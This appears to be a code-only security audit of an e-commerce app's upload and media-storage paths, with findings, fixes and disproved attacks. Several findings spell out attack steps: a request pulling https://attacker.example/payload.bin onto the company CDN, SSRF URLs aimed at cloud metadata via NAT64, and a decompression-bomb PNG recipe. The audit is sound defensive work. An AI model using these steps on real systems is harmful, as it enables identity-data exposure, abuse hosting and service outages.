# H5 — Uploads + media (R2), hacker mode

- **Task:** H5 (`task-4-hacker.md`), uploads and R2 media
- **Date:** 2026-10-26
- **Branch:** `fix/team-otp-fail-closed-rc085` (no code changes)
- **Target:** code-only review. No local harness was run (not enough time in the 10-minute box), so nothing here is "Confirmed". No R2/CDN calls and no image bombs against any service.
- **Tooling note:** `rtk` is not installed. Plain `grep`/`sed`/`cat` via Git Bash plus the Grep tool were used.

## Commands run

```
grep -rn "getSignedUrl|PutObjectCommand|getUploadPresignedUrl(" apps/api/src packages/ai/src
sed -n … apps/api/src/lib/upload-guard.ts   packages/ai/src/r2.ts   packages/ai/src/safe-fetch.ts
per-route grep of content_type / r2Key on all 13 presign routes
grep -rn "await fetch(" apps/api/src/jobs apps/api/src/routes packages/ai/src
grep -rn "limitInputPixels|sharp(" apps/api/src packages/ai/src
grep -rn "deleteObject(" apps/api/src packages/ai/src scripts
sed -n … catalog-import.ts, detector.ts, generate-ken-burns-video.ts, retailers-uploads.ts,
         products-media.ts, products-variants.ts, categories.ts, purge-retailer-now.ts, tryon.ts
```

## Result summary

| Severity | Count | IDs |
| --- | --- | --- |
| Critical | 0 | — |
| High | 0 | — |
| Medium | 3 | H5-1, H5-2, H5-3 |
| Low | 2 | H5-4, H5-5 |
| Not exploitable (attack disproved) | 7 | A1–A7 below |

All 5 findings are **Plausible** (code-only). None applied.

## Findings table

| ID | Sev | File:line | Issue | Fix |
| --- | --- | --- | --- | --- |
| H5-1 | Medium | `retailers-uploads.ts:138-148`, `r2.ts:156-159`, `tryon.ts:228-230` | Aadhaar/GST KYC scans and try-on results sit in the single public bucket. KYC stores a permanent `publicUrl`, and the try-on "presigned GET only" rule does nothing while the same object is public. | Private bucket (or a CDN rule) for `retailers/*/kyc/*` + `tryon/*`; store key only; admin reads via `getDownloadPresignedUrl` |
| H5-2 | Medium | `detector.ts:35-44`, `catalog-import.ts:133-138` | `detect-items` fetches any public URL and writes the bytes, unchecked, to the public CDN. Catalog presigns use non-staged keys that are never verified and never expire. This bypasses RC-075. | Sniff before `uploadBuffer`; use `stagingKey()` for catalog presigns |
| H5-3 | Medium | `upload-guard.ts:166-174`, `compress-r2-images.ts:47`, `generate-ken-burns-video.ts:78-104`, `schedule-templates.ts:54-169`, `my-style-vision.ts:96` | No pixel/dimension cap anywhere. sharp's default 268 MP lets a 10 MB PNG decode to about 770 MB, ffmpeg has no cap, and the container is 2 GB. | Read dimensions in `verifyUpload`, plus `limitInputPixels` on every `sharp()` |
| H5-4 | Low | `safe-fetch.ts:14-33` | SSRF blocklist misses `100.64/10`, `198.18/15`, `64:ff9b::/96` (NAT64) and `fec0::/10`. DNS-rebind TOCTOU is already documented. | Extend `isPrivateOrReservedIp` |
| H5-5 | Low | `generate-ken-burns-video.ts:54` | Raw `fetch(photo.url)` without `ssrfSafeFetch`. Not exploitable today because `photo.url` is always server-built. | Use `ssrfSafeFetch` + `readCappedBuffer` |

---

### H5-1 KYC (Aadhaar) scans and try-on results live in the public bucket             Severity: Medium
Attacker: anyone who obtains one URL (an ex-staff admin, a leaked log/screenshot, a DB dump reader, a browser-history or referrer leak). none (insider) for the bulk case.
Goal: read a retailer's Aadhaar front/back + GST certificate, or a shopper's try-on image (a photo of a real person), with no auth and no expiry.
Preconditions: R2 public access is per **bucket**, not per prefix. `R2_PUBLIC_URL` is set (product photos are served from it via `publicUrl()`), so the whole bucket is publicly readable unless a Cloudflare rule blocks some paths. No such rule could be found in the repo (could not verify the dashboard).
Steps:
1. Retailer uploads KYC: `POST /v1/retailers/me/kyc-upload-url` → `PATCH /v1/retailers/me/kyc`.
2. The server stores `kyc_aadhar_front_url = publicUrl("retailers/<id>/kyc/aadhar_front/<cuid>.jpg")` (`retailers-uploads.ts:138-148`, `verified.url` from `upload-guard.ts:203`).
3. Anyone with that string GETs `https://<R2_PUBLIC_URL>/retailers/<id>/kyc/aadhar_front/<cuid>.jpg`. It works forever, with no signature and no expiry, because the bucket is public.
4. Same for try-on: `tryon/<jobId>/result.jpg` (`tryon.ts:228-230`). `tryon.ts:258-262` says the image "should" only be handed out as a presigned GET. But the object is in the same public bucket (`r2.ts:20-29`, one client, one bucket), so the plain public URL works for anyone who knows the job id.
Impact: Aadhaar is regulated identity data (Aadhaar Act / DPDP Act 2023). Today the protection is only that the key is hard to guess (cuid), not real access control. One leaked URL means permanent exposure, and deleting the DB row does not revoke it.
Evidence: `packages/ai/src/r2.ts:156-159` (`publicUrl` = `${PUBLIC_URL}/${key}`, "works only if bucket has public access"); `packages/shared/src/constants/index.ts:345-349` (KYC path in the shared bucket); `apps/api/src/routes/retailers/retailers-uploads.ts:138-148`; `packages/ai/src/tryon.ts:228-230,258-268`.
Fix (one of):
- (a) Cheapest, config only: add a Cloudflare WAF / Transform rule on the R2 public domain: block `http.request.uri.path matches "^/retailers/[^/]+/kyc/"` and `starts_with(http.request.uri.path, "/tryon/")`. Admin and app reads already go through presigned GETs on the S3 endpoint, which bypasses the public domain. Owner action.
- (b) Code: stop storing the public URL for KYC. Store the key only and mint a short-lived presigned GET when the admin views it:
```diff
--- a/apps/api/src/routes/retailers/retailers-uploads.ts
+++ b/apps/api/src/routes/retailers/retailers-uploads.ts
@@
-    const updated = await prisma.retailer.update({
-      where: { id: request.retailerId },
-      data: { [urlField]: verified.url, [keyField]: verified.r2Key },
-    });
+    // KYC is never served from the public CDN: key only, admin view mints a presigned GET.
+    const updated = await prisma.retailer.update({
+      where: { id: request.retailerId },
+      data: { [urlField]: null, [keyField]: verified.r2Key },
+    });
```
  The admin KYC view must then call `getDownloadPresignedUrl(kyc_*_r2_key, 300)`. Neither (b) nor (c) alone removes public reachability while the bucket is public, so do (a) too, or move these prefixes to a second private bucket.
- (c) Long term: a second private bucket `kanchuki-private` for `kyc/`, `tryon/`, `measurements/`.
Status: Plausible

---

### H5-2 Unverified bytes written to the public CDN: catalog detect-items and catalog presigns             Severity: Medium
Attacker: retailer (any plan with `AI_TAGGING_CALL` quota)
Goal: host arbitrary files (up to 25 MB per fetch, 15/50 MB per presign) on Kanchuki's CDN domain, permanently, outside the RC-075 `verifyUpload` gate.
Preconditions: authenticated retailer.
Steps:
1. `POST /v1/catalog-import/detect-items {"image_url":"https://attacker.example/payload.bin"}`.
2. `detectCropAndTag` → `fetchImageBuffer` (SSRF-guarded, ≤25 MB) → `uploadBuffer("catalog-import/<retailerId>/<sha16>.jpg", bytes, "image/jpeg")` with **no magic-byte sniff** (`detector.ts:35-44`). The key is not under `uploads/pending/`, so the lifecycle rule never expires it.
3. The response returns `croppedUrl`, a public CDN URL now serving attacker bytes.
4. Separately, `POST /v1/catalog-import/upload-url` hands out `catalog-source/<id>/<hex>.jpg` / `catalog-pdf/<id>/<hex>.pdf` (`catalog-import.ts:133-138`), again **not** `stagingKey()`. Nothing ever runs `verifyUpload` on these keys, so whatever is PUT stays.
5. The later `POST …/create-products` does run `verifyUpload` (`catalog-import.ts:383-389`). It rejects non-images but does **not** delete them: the key is "final", not staged (`upload-guard.ts:169`), so the payload stays.
Impact: free file hosting for malware, phishing kits or illegal content on a Kanchuki-branded domain (domain reputation, abuse takedowns), plus unbounded storage cost. It is **not** stored XSS: Content-Type is fixed to `image/jpeg` / `application/pdf` (presign enum + `uploadBuffer` constant), and browsers do not sniff `image/*` into HTML. A PDF with embedded JS opens in the browser's sandboxed PDF viewer, not on our origin.
Evidence: `packages/ai/src/detector.ts:35-44`; `apps/api/src/routes/catalog-import.ts:133-138,157-178`; `apps/api/src/lib/upload-guard.ts:166-174` (only staged keys are deleted on reject).
Fix:
```diff
--- a/packages/ai/src/detector.ts
+++ b/packages/ai/src/detector.ts
@@ export async function detectCropAndTag(
   const imageBuffer = await fetchImageBuffer(sourceImageUrl);
+  // Same gate as verifyUpload (RC-075): only real JPEG/PNG/WebP bytes reach the public CDN.
+  const isJpeg = imageBuffer[0] === 0xff && imageBuffer[1] === 0xd8 && imageBuffer[2] === 0xff;
+  const isPng = imageBuffer.subarray(0, 4).equals(Buffer.from([0x89, 0x50, 0x4e, 0x47]));
+  const isWebp =
+    imageBuffer.toString('latin1', 0, 4) === 'RIFF' && imageBuffer.toString('latin1', 8, 12) === 'WEBP';
+  if (!isJpeg && !isPng && !isWebp) throw new Error('Not a JPEG/PNG/WebP image');
   const r2Key = `catalog-import/${retailerId}/${createHash('sha256').update(imageBuffer).digest('hex').slice(0, 16)}.jpg`;
```
(ponytail: `packages/ai` cannot import `sniffImageType` from `apps/api`. Moving `sniffUploadType` into `packages/ai` and importing it from both is the cleaner follow-up.)
```diff
--- a/apps/api/src/routes/catalog-import.ts
+++ b/apps/api/src/routes/catalog-import.ts
@@
-    const r2Key = `${prefix}/${retailerId}/${randHex(16)}${ext}`;
+    // Staged like every other presign route, so an unconfirmed upload expires.
+    const r2Key = stagingKey(`${prefix}/${retailerId}/${randHex(16)}${ext}`);
```
The mobile client and whatever reads `catalog-source/` must then pass the staged key through a `verifyUpload` confirm. Check the F-001b/F-001d callers before applying. Could not verify in time.
Status: Plausible

---

### H5-3 No pixel cap: decompression bomb against compress cron, Ken Burns ffmpeg, scheduler templates, My Style             Severity: Medium
Attacker: retailer (product photo, logo, banner, category image), signed-in shopper (My Style selfie)
Goal: crash or OOM the API container (2 GB, per `compress-r2-images.ts:47`), taking every tenant down. Repeatable, because the cron re-decodes the same object daily.
Preconditions: one upload that passes `verifyUpload`.
Steps:
1. Build a PNG of 16 000 × 16 000 px, solid colour. It deflates to a few hundred KB, well under `maxBytes` 10 MB. Decoded RGB is ≈ 768 MB.
2. `POST /v1/products/:id/photos/upload-url {"content_type":"image/jpeg", …}` → key ends `.jpg`. PUT the **PNG** bytes. The signature binds only Content-Type and length, not the body.
3. Confirm. `verifyUpload` accepts it because it allows any of `IMAGE_KINDS` and never checks that the sniffed kind equals the declared type (`upload-guard.ts:166-167`). It never reads dimensions either.
4. Trigger points:
   - Daily `compress-r2-images` lists **every** object and decodes `.jpg` keys with sharp. sharp's default `limitInputPixels` is 268 402 689 (16 384²), so 256 MP passes, and it runs 2 at a time. A PNG at a `.jpg` key gets no JPEG shrink-on-load.
   - Ken Burns: `generate-ken-burns-video.ts:78-104` feeds the file straight to ffmpeg `scale=…force_original_aspect_ratio=increase` with no input-size cap (up to `MAX_PHOTOS` at once).
   - F-043 scheduler templates: `schedule-templates.ts:54-169` runs `sharp(photo)` at publish time with no limit.
   - My Style: `my-style-vision.ts:96` runs `sharp(photo)` on the shopper upload, default limit.
Impact: API OOM-kill / restart loop on the shared container. Railway memory was already a production incident (`docs/tasks/pending/improvments-railway.md`). Every retailer's storefront and app is affected.
Evidence: `grep -rn limitInputPixels apps/api/src packages/ai/src` → **0 hits**; files and lines above.
Fix: cap at the gate, so every consumer is covered, and belt-and-braces at decode:
```diff
--- a/apps/api/src/lib/upload-guard.ts
+++ b/apps/api/src/lib/upload-guard.ts
@@
-  let obj = await inspectObject(r2Key);
+  // 64 KB head is enough for sharp to read JPEG/PNG/WebP dimensions (header only, no decode).
+  let obj = await inspectObject(r2Key, 65_536);
@@
   const kind = sniffUploadType(obj.head);
-  if (obj.size > maxBytes || !kind || !allowed.includes(kind)) {
+  const tooManyPixels =
+    !!kind && IMAGE_KINDS.includes(kind) &&
+    (await sharp(obj.head).metadata().then((m) => (m.width ?? 0) * (m.height ?? 0) > MAX_PIXELS, () => true));
+  if (obj.size > maxBytes || !kind || !allowed.includes(kind) || tooManyPixels) {
```
with `const MAX_PIXELS = 40_000_000; // ponytail: ~8K×5K, above any phone camera` and `import sharp from 'sharp'`. Also pass `{ limitInputPixels: 40_000_000 }` to every `sharp(input)` call in `packages/ai` (schedule-templates, my-style-vision, compress helper), and to ffmpeg either pre-resize with sharp or add `-max_pixels` via the `scale` input. Check before applying: JPEG files with a large EXIF/APP1 block may need more than 64 KB of head. Decide whether a failed metadata read should reject (fail closed, as drafted) or skip.
Status: Plausible

---

### H5-4 SSRF blocklist gaps in `ssrfSafeFetch`             Severity: Low
Attacker: retailer (`detect-items` `image_url`, `detect-pdf` `pdf_url` / `page_images[]`), anyone on the unauthenticated try-on `customer_photo_url` (per `safe-fetch.ts:4-7`)
Goal: reach internal addresses the blocklist misses.
Preconditions: a target inside one of the unlisted ranges, or a NAT64 gateway on the egress path.
Steps: `image_url=http://100.64.0.1/…` (CGNAT / some PaaS internal ranges), `http://[64:ff9b::a9fe:a9fe]/latest/meta-data/` (NAT64-mapped 169.254.169.254), `198.18.0.1` (benchmark range). Each passes `isPrivateOrReservedIp` (`safe-fetch.ts:14-33`), which checks only 0/8, 10/8, 127/8, 169.254/16, 172.16/12, 192.168/16, ≥224, and IPv6 `::1`, `::`, `fe80:`, `fc`/`fd`, `::ffff:`.
Impact: low on Railway today. Railway private networking is `fd12::/16`, which is covered. The DNS-rebinding TOCTOU (check-then-fetch with a separate lookup) is a known, documented ceiling (`safe-fetch.ts:57-62`).
Evidence: `packages/ai/src/safe-fetch.ts:14-33`.
Fix:
```diff
--- a/packages/ai/src/safe-fetch.ts
+++ b/packages/ai/src/safe-fetch.ts
@@
     if (a === 169 && b === 254) return true // link-local, incl. 169.254.169.254 cloud metadata
+    if (a === 100 && b >= 64 && b <= 127) return true // 100.64/10 CGNAT
+    if (a === 198 && (b === 18 || b === 19)) return true // 198.18/15 benchmark
     return false
@@
-    if (lower.startsWith('fe80:') || lower.startsWith('fc') || lower.startsWith('fd')) return true
+    if (/^fe[89ab]/.test(lower) || /^fe[c-f]/.test(lower) || lower.startsWith('fc') || lower.startsWith('fd')) return true
+    if (lower.startsWith('64:ff9b:')) return true // NAT64 can map to any IPv4, incl. metadata
```
Status: Plausible

---

### H5-5 Ken Burns falls back to a raw `fetch(photo.url)`             Severity: Low
Attacker: none today
Goal: SSRF or unbounded download if `product_photos.url` ever holds a client value.
Preconditions: a future write path that stores a client URL. Every current writer stores `verifyUpload().url` or a server-built URL: `products-media.ts:93-107`, `products-variants.ts:32-39,60-66`, studio-shoot job.
Steps: n/a.
Impact: defence in depth only. Also no size cap: `resp.arrayBuffer()` reads the whole body.
Evidence: `apps/api/src/jobs/generate-ken-burns-video.ts:52-61`.
Fix:
```diff
-            const resp = await fetch(photo.url);
-            if (resp.ok) {
-              const arrayBuf = await resp.arrayBuffer();
-              buf = Buffer.from(arrayBuf);
-            }
+            const resp = await ssrfSafeFetch(photo.url);
+            if (resp.ok) buf = await readCappedBuffer(resp);
```
(import both from `@kanchuki/ai`; check they are exported from the package index first.)
Status: Not exploitable (hardening)

---

## Attacks disproved (Not exploitable, with proof)

| # | Attack | Result | Proof |
| --- | --- | --- | --- |
| A1 | Oversize PUT via presigned URL | Blocked. `ContentLength` is signed; a different-size PUT fails the signature. Every route bounds `content_length` (zod `max`) | `r2.ts:34-54`; e.g. `retailers-uploads.ts:89`, `catalog-import.ts:125-130` |
| A2 | Wrong type: SVG / HTML / JS / text served from our CDN (stored XSS) | Blocked. All 13 presign routes use a `z.enum` of jpeg/png/webp (+pdf for KYC GST and catalog, + mp4/mov/webm for videos). No route accepts `image/svg+xml` or `text/*`. Content-Type is signed, so R2 serves the declared type. Confirm also sniffs magic bytes | grep of `content_type` across `catalog-import.ts:96`, `categories.ts:65`, `growth-videos.ts:45`, `products-media.ts:31`, `retailers-showcase-designs.ts:171`, `retailers-uploads.ts:23,53,86`, 5 admin routes; `upload-guard.ts:42-75` |
| A3 | Confirm with another retailer's key / traversal | Blocked. `isOwnedKey` requires the `retailers/<sessionId>/` prefix (from `request.retailerId`, never the body) and rejects `..`, `//`, `\`. An empty prefix never matches | `upload-guard.ts:114-127,154-155` |
| A4 | Reuse the presigned URL after confirm | Own-tenant only. A re-PUT within the 5-min window recreates the staged object (orphan → lifecycle rule). Re-confirming it overwrites the retailer's **own** final key with another image that passes the sniff (copy is bound to the inspected ETag, `upload-guard.ts:178-191`). No cross-tenant effect. *Could not verify* that the R2 lifecycle rule on `uploads/pending/` actually exists (dashboard). | `upload-guard.ts:176-195` |
| A5 | Guess or list keys to scrape other retailers' photos / shopper images | Keys use `createId()` (cuid2), `randomBytes(16)` or a sha256 prefix, so they are not enumerable. No API route exposes `listObjects` (used only by the compress/measure crons). Public-domain bucket listing: R2 public buckets do not serve a listing at `/` (platform behaviour, not verified live). The product photos are public by design; see H5-1 for the sensitive prefixes | `categories.ts:76`, `retailers-uploads.ts:34,64,102`, `catalog-import.ts:135`, `r2.ts:166-186` |
| A6 | Delete/purge reaching another retailer's objects (BUILD-LOG §26 shape) | Not reachable. Purge keys come only from the retailer's own rows (`WHERE retailer_id = $1`), and every row key was written via `verifyUpload` (own prefix) or by a server job. No prefix-based bulk delete exists in `apps/api`. `scripts/cleanup-r2-product-images.ts:85` is an operator script, out of scope | `purge-retailer-now.ts:47-56,178`; `purge-soft-deleted.ts:128-145`; `products-media.ts:207-226` |
| A7 | ffmpeg argument/filter injection via file names | Not reachable. Inputs are server-chosen temp paths (`photo-<i>.jpg`) passed through `execFile` (no shell), and the filter graph uses only numeric constants | `generate-ken-burns-video.ts:66-104` |

## Not checked / follow-ups

- **Local harness not run** (time). A good next one: Fastify `inject()` with a stubbed `@kanchuki/ai` S3 client to confirm A3 and the H5-3 "PNG bytes at a `.jpg` key pass `verifyUpload`" claim.
- **Owner checks (dashboard, read-only):** (1) is the R2 bucket public (r2.dev or custom domain), and is any WAF rule protecting `kyc/` or `tryon/`? This decides H5-1. (2) Does the lifecycle rule on `uploads/pending/` exist? (A4, RC-075 assumption.)
- Not reviewed: studio-shoot / FLUX / Fal result fetching (`jobs/studio-shoot.ts`, `lib/gemini-image.ts`), photo-cleanup Python service input limits, `measurementPhoto` path (`measurements/<customerId>/…`, probably dead after the teardown), the unauthenticated try-on `customer_photo_url` route's own size/pixel limits, and the PDF-in-browser behaviour of `catalog-pdf/` objects.
- Small note, not a finding: `categories.ts:53` accepts any `image_url` that starts with `publicUrl('')`. If `R2_PUBLIC_URL` were unset, `publicUrl('')` = `/`, and a protocol-relative `//evil.example/x.png` would pass. Prod has the variable set.
- Cross-refs: RC-075 (H5-2 is a path outside its gate), RC-080 (A1 holds), RC-044/RC-072 (try-on deletion; H5-1 is about read access, not deletion), BUILD-LOG §26 (A6), T2.6 (no CSP; irrelevant to H5 because no HTML is served from R2).
